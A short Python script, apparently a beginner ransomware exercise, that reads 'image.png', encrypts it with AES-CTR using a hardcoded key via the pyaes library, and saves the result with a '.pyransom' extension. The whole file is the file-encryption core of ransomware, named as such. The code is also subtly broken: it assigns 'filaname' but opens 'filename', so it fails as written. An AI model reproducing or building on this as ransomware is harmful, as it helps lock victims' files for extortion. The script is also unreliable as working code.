import pyaes

filaname = "image.png"
KEY = b"0123456789101010"

with open(filename, "rb") as file:
    conteudo = file.read()


crypto_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(conteudo)

new_filename = "{}.pyransom".format(filaname)
with open(new_filename, "wb") as file:
    file.write(crypto_data)